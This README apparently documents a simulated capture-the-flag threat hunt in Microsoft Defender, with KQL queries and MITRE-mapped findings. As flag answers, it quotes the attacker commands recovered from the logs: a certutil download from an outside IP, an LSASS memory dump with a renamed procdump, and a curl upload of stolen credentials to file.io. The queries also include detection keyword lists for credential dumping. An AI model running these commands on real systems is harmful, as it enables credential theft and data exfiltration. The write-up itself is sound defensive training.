# THE AZUKI BREACH SAGA Part 2: Cargo Hold

This repository documents a simulated incident response and threat hunting investigation using Microsoft Defender for Endpoint.

## Objectives
This repository documents a full threat hunting and incident response investigation conducted using Microsoft Defender for Endpoint and Advanced Hunting. The objective is to demonstrate a clear, methodical SOC investigation process while keeping documentation simple, readable, and easy to revisit for learning and review purposes.

This hunt mirrors real-world IR artifacts analysts are expected to produce: queries, findings, timelines, indicators, and conclusions mapped to MITRE ATT&CK.

## Incident Brief
Organization: Azuki Import/Export (梓貿易株式会社)

Situation: After establishing initial access on November 19th, the attacker returned approximately 72 hours later. During the return session, suspicious lateral movement and large data transfers were observed overnight on a file server.

Primary Target:
` azuki-fileserver01`

Evidence Source:
` Microsoft Defender for Endpoint logs `

## Query Starting Point:
```
DeviceLogonEvents
| where DeviceName contains "azuki"
```

## Tools Used
- Microsoft Defender for Endpoint (Advanced Hunting)
- Microsoft Sentinel
- Kusto Query Language (KQL)
- MITRE ATT&CK Framework

## Investigation Mindset and Methodology

The investigation followed a structured attack progression approach:

- Initial Access
- Lateral Movement
- Discovery
- Collection
- Credential Access
- Exfiltration
- Persistence
- Anti-Forensics

## Focus areas throughout the hunt:

- Documenting how evidence was found, not only the answers
- Building a clear investigation timeline
- Correlating events across multiple data sources
- Mapping findings to MITRE ATT&CK techniques

This exercise prioritizes methodology and analyst reasoning over speed or flag completion.

# Flags and Findings Summary

#### Flag 01 – Initial Access: Return Connection Source
- Answer: `159.26.106.98`
- Technique: Initial Access (TA0001)
- Summary: Attacker reconnected using a different IP address, indicating infrastructure rotation after dwell time.

```
DeviceLogonEvents
| where DeviceName contains "azuki-sl"
| where Timestamp >= datetime(2025-11-22)
| project Timestamp, ActionType, AccountName, RemoteIP, RemoteIPType
| order by Timestamp asc
```
<img width="832" height="202" alt="Screenshot 2025-12-10 094240" src="https://github.com/user-attachments/assets/7aa4abb4-43d9-471d-91b6-83fa0b604506" />

#### Flag 02 – Lateral Movement: Compromised Device
- Answer: `azuki-fileserver01`
- Technique: Lateral Movement (TA0008)
- Summary: RDP activity identified via mstsc.exe execution from the compromised beachhead.

```
DeviceProcessEvents
| where DeviceName contains "azuki"
| where FileName =~ "mstsc.exe"
| project Timestamp, DeviceName, ProcessCommandLine
```
<img width="862" height="246" alt="Screenshot 2025-12-10 105111" src="https://github.com/user-attachments/assets/26896bf4-7375-4c99-a801-c0e8beeab702" />

```
DeviceLogonEvents
| where RemoteIP == "10.1.0.108"
| project Timestamp, RemoteIP, DeviceName, AccountName, LogonType
```
<img width="1034" height="181" alt="Screenshot 2025-12-10 105028" src="https://github.com/user-attachments/assets/56ff97a4-6e63-4664-8865-77ee955d6177" />

#### Flag 03 – Lateral Movement: Compromised Account
- Answer:` fileadmin`
- Technique: Valid Accounts (T1078)

<img width="1034" height="181" alt="Screenshot 2025-12-10 105028" src="https://github.com/user-attachments/assets/28530206-2b0b-4c9d-b57b-2fe8049e99b8" />

#### Flag 04 – Discovery: Local Share Enumeration
- Answer: `"net.exe" share`
- Technique: Network Share Discovery (T1135)
```
DeviceProcessEvents 
| where DeviceName =~ "azuki-fileserver01" 
| where ProcessCommandLine has_any ("net share", "net view", "azuki-fileserver01", "net share", "Get-SmbShare", "share", "SmbShare") 
| project Timestamp, FileName, ProcessCommandLine | order by Timestamp asc
```
<img width="603" height="108" alt="Screenshot 2025-12-12 144454" src="https://github.com/user-attachments/assets/fa2ab2af-e5de-45e5-95d3-29d9a80dfd86" />

#### Flag 05 – Discovery: Remote Share Enumeration
- Answer: `"net.exe" view \10.1.0.188`
- Technique: Network Share Discovery (T1135)
```
DeviceProcessEvents
| where DeviceName =~ "azuki-fileserver01"
| where ProcessCommandLine has @"\\"
| project Timestamp, FileName, ProcessCommandLine
| order by Timestamp asc
```
<img width="875" height="103" alt="Screenshot 2025-12-12 152326" src="https://github.com/user-attachments/assets/f3237bd3-94f9-4bcd-9355-ae182b52d6a0" />

#### Flag 06 – Discovery: Privilege Enumeration
- Answer: `"whoami.exe" /all`
- Technique: System Owner/User Discovery (T1033)
```
DeviceProcessEvents
| where DeviceName =~ "azuki-fileserver01"
| where FileName contains "whoami"
| project Timestamp, FileName, ProcessCommandLine
| order by Timestamp asc
```
<img width="621" height="131" alt="Screenshot 2025-12-12 154121" src="https://github.com/user-attachments/assets/7d34c1a0-9b0b-468d-9138-af34998659ac" />

#### Flag 07 – Discovery: Network Configuration
- Answer: `"ipconfig.exe" /all`
- Technique: System Network Configuration Discovery (T1016)
```
DeviceProcessEvents
| where DeviceName =~ "azuki-fileserver01"
| where FileName =~ "ipconfig.exe"
| where ProcessCommandLine contains "ipconfig"
| project Timestamp, FileName, ProcessCommandLine
| order by Timestamp asc
```
<img width="632" height="156" alt="Screenshot 2025-12-12 154454" src="https://github.com/user-attachments/assets/ffb7961e-9b83-4007-afcb-05455e7b090b" />

#### Flag 08 – Defense Evasion: Directory Hiding
- Answer: `"attrib.exe" +h +s C:\Windows\Logs\CBS`
- Technique: Hidden Files and Directories (T1564.001)
```
DeviceProcessEvents
| where DeviceName =~ "azuki-fileserver01"
| where FileName =~ "attrib.exe"
| where ProcessCommandLine contains "attrib"
| project Timestamp, FileName, ProcessCommandLine
| order by Timestamp asc
```
<img width="675" height="124" alt="Screenshot 2025-12-12 154810" src="https://github.com/user-attachments/assets/f29ca042-a83a-436e-9ed5-a76326ebfb3d" />

#### Flag 09 – Collection: Staging Directory
- Answer: `C:\Windows\Logs\CBS`
- Technique: Data Staged: Local Data Staging (T1074.001)
<img width="675" height="124" alt="Screenshot 2025-12-12 154810" src="https://github.com/user-attachments/assets/ec20ac9e-63eb-4c30-a94c-5efb333ba1ab" />

#### Flag 10 – Defense Evasion: Script Download
- Answer: `"certutil.exe" -urlcache -f http://78.141.196.6:7331/ex.ps1 C:\Windows\Logs\CBS\ex.ps1`
- Technique: Ingress Tool Transfer (T1105)
```
DeviceProcessEvents
| where DeviceName =~ "azuki-fileserver01"
| where ProcessCommandLine contains "Certutil.exe"
| project Timestamp, FileName, ProcessCommandLine
| order by Timestamp asc
```
<img width="972" height="174" alt="Screenshot 2025-12-12 160343" src="https://github.com/user-attachments/assets/739c8bd2-4fe5-4476-9ba1-340c41b81fb7" />

#### Flag 11 – Collection: Credential File Discovery
- Answer: `IT-Admin-Passwords.csv`
- Technique: Unsecured Credentials (T1552)
```
DeviceFileEvents
| where DeviceName == "azuki-fileserver01"
| where FileName endswith ".csv" 
| project Timestamp, FileName, FolderPath
| order by Timestamp asc
```
<img width="569" height="121" alt="Screenshot 2025-12-12 163934" src="https://github.com/user-attachments/assets/349c2853-7cd4-4d31-967f-77304ec79228" />

#### Flag 12 – Collection: Recursive Copy
- Answer: `"xcopy.exe" C:\FileShares\IT-Admin C:\Windows\Logs\CBS\it-admin /E /I /H /Y`
- Technique: Automated Collection (T1119)
```
DeviceProcessEvents
| where FileName in~ ("robocopy.exe", "xcopy.exe")
| project Timestamp, FileName, ProcessCommandLine
| order by Timestamp asc
```
<img width="941" height="123" alt="Screenshot 2025-12-12 165033" src="https://github.com/user-attachments/assets/7060f3bc-eafe-493d-8d3e-4751dfbb5168" />

#### Flag 13 – Collection: Compression
- Answer: `"tar.exe" -czf C:\Windows\Logs\CBS\credentials.tar.gz -C C:\Windows\Logs\CBS\it-admin .`
- Technique: Archive via Utility (T1560.001)
```
DeviceProcessEvents
| where DeviceName == "azuki-fileserver01"
| where FileName in~ ("7z.exe","7za.exe","tar.exe","gzip.exe","zip.exe","rar.exe")
| project Timestamp, FileName, ProcessCommandLine, InitiatingProcessAccountName
| order by Timestamp asc
```
<img width="1123" height="149" alt="Screenshot 2025-12-16 085306" src="https://github.com/user-attachments/assets/34cc83bb-a430-4682-a719-da8ff8f96690" />

#### Flag 14 – Credential Access: Renamed Tool
- Answer: `pd.exe`
- Technique: Masquerading (T1036.003)
```
DeviceProcessEvents
| where DeviceName == "azuki-fileserver01"
| where FileName endswith ".exe"
| where ProcessCommandLine has_any ("lsass","sekurlsa","logonpasswords")
| project TimeGenerated, FileName, ProcessCommandLine
```
<img width="881" height="115" alt="Screenshot 2025-12-16 091323" src="https://github.com/user-attachments/assets/0d0215bf-9471-4142-9f85-5bf23213c5b6" />

#### Flag 15 – Credential Access: LSASS Dump
- Answer: `"pd.exe" -accepteula -ma 876 C:\Windows\Logs\CBS\lsass.dmp`
- Technique: LSASS Memory (T1003.001)
```
DeviceProcessEvents
| where DeviceName == "azuki-fileserver01"
| where FileName endswith ".exe"
| where ProcessCommandLine has_any ("lsass","sekurlsa","logonpasswords")
| project TimeGenerated, FileName, ProcessCommandLine
```
<img width="881" height="115" alt="Screenshot 2025-12-16 091323" src="https://github.com/user-attachments/assets/9f038a0a-609d-4b7e-9272-163423012088" />

#### Flag 16 – Exfiltration: Upload Command
- Answer: `"curl.exe" -F file=@C:\Windows\Logs\CBS\credentials.tar.gz https://file.io`
- Technique: Exfiltration Over Web Service (T1567)
```
DeviceProcessEvents
| where DeviceName == "azuki-fileserver01"
| where FileName == "curl.exe"
| where ProcessCommandLine has_any ("http://","https://")
| project Timestamp, FileName, ProcessCommandLine
| order by Timestamp asc
```
<img width="821" height="113" alt="Screenshot 2025-12-16 105429" src="https://github.com/user-attachments/assets/e499fed7-3103-4f08-85ef-8372847847ea" />

#### Flag 17 – Exfiltration: Cloud Service
- Answer: `file.io`
- Technique: Exfiltration to Cloud Storage (T1567.002)

#### Flag 18 – Persistence: Registry Value Name
- Answer: `FileShareSync`
- Technique: Registry Run Keys (T1547.001)
```
DeviceRegistryEvents
| where DeviceName == "azuki-fileserver01"
| where ActionType in ("RegistryValueSet","RegistryValueModified")
| where RegistryKey has @"\Microsoft\Windows\CurrentVersion\Run"
| project TimeGenerated, RegistryKey, RegistryValueName, RegistryValueData, InitiatingProcessFileName
| order by TimeGenerated asc
```
<img width="692" height="190" alt="Screenshot 2025-12-16 112540" src="https://github.com/user-attachments/assets/0b1a22b4-fb22-47ae-a135-0fe8056a8a1e" />

#### Flag 19 – Persistence: Beacon Filename
- Answer: `svchost.ps1`
- Technique: Masquerading (T1036.005)
```
DeviceRegistryEvents
| where DeviceName == "azuki-fileserver01"
| where ActionType in ("RegistryValueSet","RegistryValueModified")
| where RegistryValueName == "FileShareSync"
| project Timestamp, RegistryKey, RegistryValueName, RegistryValueData
```
<img width="676" height="145" alt="Screenshot 2025-12-16 114108" src="https://github.com/user-attachments/assets/664a6131-2c2f-40af-a9da-41526e0bdb6e" />

#### Flag 20 – Anti-Forensics: PowerShell History Deletion
- Answer: `ConsoleHost_history.txt`
- Technique: Indicator Removal on Host (T1070.003)
```
DeviceFileEvents
| where DeviceName == "azuki-fileserver01"
| where ActionType == "FileDeleted"
| where FileName == "ConsoleHost_history.txt"
```
<img width="827" height="178" alt="Screenshot 2025-12-16 114759" src="https://github.com/user-attachments/assets/88ae30be-93fa-4f03-a343-18b023f66d59" />


# Incident Timeline Summary
- Initial access established on azuki-sl
- Attacker returned after ~72 hours using new infrastructure
- RDP lateral movement to azuki-fileserver01
- Extensive discovery and share enumeration
- Data staged in hidden directory
- Credentials dumped from LSASS
- Data compressed and exfiltrated via cloud service
- Registry-based persistence established
- PowerShell history deleted to hinder forensic analysis

# Indicators of Compromise
## IP Addresses
- 159.26.106.98
- 78.141.196.6

# Files and Artifacts
- IT-Admin-Passwords.csv
- credentials.tar.gz
- lsass.dmp
- svchost.ps1
- ConsoleHost_history.txt
- Registry
- HKCU\Software\Microsoft\Windows\CurrentVersion\Run
- Value Name: FileShareSync
- Abused Utilities
- certutil.exe
- xcopy.exe
- tar.exe
- curl.exe

# Key Takeaways
- Attackers relied heavily on built-in Windows utilities to evade detection
- File servers remain high-value targets due to sensitive data concentration
- Registry-based persistence and artifact cleanup indicate moderate attacker maturity

# Purpose of This Repository
This repository serves as:
- A learning artifact for developing SOC investigation skills
- A personal reference for reviewing threat hunting methodology
- A portfolio example demonstrating structured incident response documentation

All findings are derived from log-based evidence using a systematic investigation process.


